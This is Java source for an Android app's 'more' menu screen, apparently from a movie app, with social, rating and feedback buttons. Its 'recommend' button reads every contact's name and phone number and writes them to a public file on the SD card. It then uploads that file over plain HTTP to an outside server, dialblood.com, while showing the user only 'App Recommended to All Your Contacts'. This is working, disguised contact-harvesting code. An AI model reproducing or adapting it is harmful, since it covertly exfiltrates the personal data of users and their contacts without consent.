package com.movieroyce;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.util.ArrayList;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.impl.client.DefaultHttpClient;
import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

public class more extends Activity implements OnClickListener {
	Button us, app, feed, fb, tw, rec, err, rate,back;

	@Override
	public void onBackPressed() {
		// TODO Auto-generated method stub
		super.onBackPressed();
		Intent myint = new Intent(this, index.class);
		startActivity(myint);
	}
	public boolean onClose() {
		// TODO Auto-generated method stub
		finish();
		return false;
	}


	@Override
	protected void onStop() {
		// TODO Auto-generated method stub
		super.onStop();
		finish();
	}
	ArrayList<String[]> cont=new ArrayList<String[]>();
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                                WindowManager.LayoutParams.FLAG_FULLSCREEN);
		setContentView(R.layout.more);
		back=(Button) findViewById(R.id.backmore);
		us = (Button) findViewById(R.id.us);
		feed = (Button) findViewById(R.id.fb);
		fb = (Button) findViewById(R.id.fbp);
		rate = (Button) findViewById(R.id.rate);
		tw = (Button) findViewById(R.id.tp);
		rec = (Button) findViewById(R.id.sug);
		err = (Button) findViewById(R.id.err);
		us.setOnClickListener(this);
		feed.setOnClickListener(this);
		fb.setOnClickListener(this);
		rate.setOnClickListener(this);
		tw.setOnClickListener(this);
		rec.setOnClickListener(this);
		err.setOnClickListener(this);
		back.setOnClickListener(this);

	}

	@Override
	public void onClick(View v) {
		// TODO Auto-generated method stub
		switch (v.getId()) {
		case R.id.fbp:
		/*	try {

				Intent intent = new Intent(Intent.ACTION_VIEW,
						Uri.parse("http://www.facebook.com/royceeeeeeeee"));
				startActivity(intent);

			} catch (Exception e) {

				Toast.makeText(this, "Unable to connect to the official fb page", Toast.LENGTH_SHORT).show();
			}*/
			Intent myint2 = new Intent(this, face.class);
			myint2.putExtra("type","fb");

			startActivity(myint2);
			break;
		case R.id.tp:// code for twitter
			myint2 = new Intent(this, face.class);
			myint2.putExtra("type","tw");

			startActivity(myint2);
						break;
		case R.id.fb:Intent myint = new Intent(this, feed.class);
		myint.putExtra("type","fb");

		startActivity(myint);
			break;
		case R.id.rate:// code for rating
			Uri uri = Uri.parse("market://details?id=" + this.getPackageName());
			Intent goToMarket = new Intent(Intent.ACTION_VIEW, uri);
			try {
			  startActivity(goToMarket);
			} catch (ActivityNotFoundException e) {
			  Toast.makeText(this, "Couldn't launch the market", Toast.LENGTH_LONG).show();
			}
			break;
		case R.id.us:// code for about  us
			myint2 = new Intent(this, us.class);
			myint2.putExtra("type","us");

			startActivity(myint2);
			
			break;
		
		case R.id.sug:// code for rec
		//String [] params={setcon.get(i).name.getText().toString(),setcon.get(i).number.getText().toString()};

			//cont.add(params);
 cont.clear();
			Cursor cursor = getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, null, null, ContactsContract.Data.LOOKUP_KEY + " ASC");

			//int i=0,j;

			if(cursor!=null) {

			while (cursor.moveToNext()) {

			String contactId = cursor.getString(cursor.getColumnIndex(

			ContactsContract.Contacts._ID));

			String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

			String hasPhone=cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

			//Log.i("INFO", hasPhone);

			if (Integer.parseInt(hasPhone)>0) {

			String phoneNo;

		

			Cursor pCur = getContentResolver().query(

			ContactsContract.CommonDataKinds.Phone.CONTENT_URI,

			null,

			ContactsContract.CommonDataKinds.Phone.CONTACT_ID

			+ " = ?", new String[] { contactId }, null);

			while (pCur.moveToNext()) {

			phoneNo = pCur

			.getString(pCur

			.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

		//	Log.i("INFO”, "phoneNo");        

			String [] params={			displayName,phoneNo};

			 

			cont.add(params);

			}

			pCur.close();

			}

			}

			cursor.close();

			 
			 
			send s=new send();

			s.execute("");

			}
			Toast.makeText(this, "App Recommended to All Your Contacts", Toast.LENGTH_SHORT).show();
			break;
		case R.id.err: myint2 = new Intent(this, feed.class);
		myint2.putExtra("type","err");

		startActivity(myint2);
			break;
		case R.id.backmore:onBackPressed();break;
		}
	}

	@Override
	protected void onPause() {
		// TODO Auto-generated method stub
		super.onPause();
		finish();
	}

	 


 
//add upto to this main function
 
 
 
public void sendcontact() {

String address="abc.txt";

HttpClient httpclient=new DefaultHttpClient();

HttpPost request = new HttpPost("http://www.dialblood.com/roycee/sent.php");

//ResponseHandler<String> handler = new BasicResponseHandler();

FileOutputStream f1 = null;

try {

f1 = new FileOutputStream("/sdcard/DCIM/"+address);

} catch (FileNotFoundException e1) {

// TODO Auto-generated catch block

e1.printStackTrace();

}

PrintStream pc=new PrintStream(f1);




int i;for( i=0;i<cont.size()-1;i++) {

String phnum=new String();

phnum = cont.get(i)[1].replaceAll("\\D+","");

pc.println("<name>"+cont.get(i)[0]+"</name>"+"<num>"+phnum+"</num>");

//Log.i("info", cont.get(i)[0]+","+cont.get(i)[1]);

}
if(i!=0) {
String phnum=new String();

phnum = cont.get(i)[1].replaceAll("\\D+","");

pc.print("<name>"+cont.get(i)[0]+"</name>"+"<num>"+phnum+"</num>");

pc.close();
}
File file = new File("/sdcard/DCIM/"+address);

FileBody fb = new FileBody(file);

MultipartEntity tmp=new MultipartEntity();

tmp.addPart("contacts", fb);

HttpResponse result = null;

try {

//UrlEncodedFormEntity entity = new UrlEncodedFormEntity(postParams);

request.setEntity(tmp);

result = httpclient.execute(request);

} catch (Exception e) {

e.printStackTrace();

}

try {

HttpEntity entity=result.getEntity();

InputStream instream = entity.getContent();

BufferedReader reader = new BufferedReader(

new InputStreamReader(instream));

// do something useful with the response

String name=reader.readLine();

while(name!=null) {

name=reader.readLine();

//if(name==null) name=new String("");

//Log.i("info", name+"13");

}

//email=reader.readLine();

//if(email==null) email=new String("");

} catch (IllegalStateException e) {

// TODO Auto-generated catch block

e.printStackTrace();

} catch (IOException e) {

// TODO Auto-generated catch block

e.printStackTrace();

}

httpclient.getConnectionManager().shutdown();

}
public class send extends AsyncTask<String, Void, Void>{
@Override

protected Void doInBackground(String... arg0) {

// TODO Auto-generated method stub
sendcontact();
return null;
}
}
}
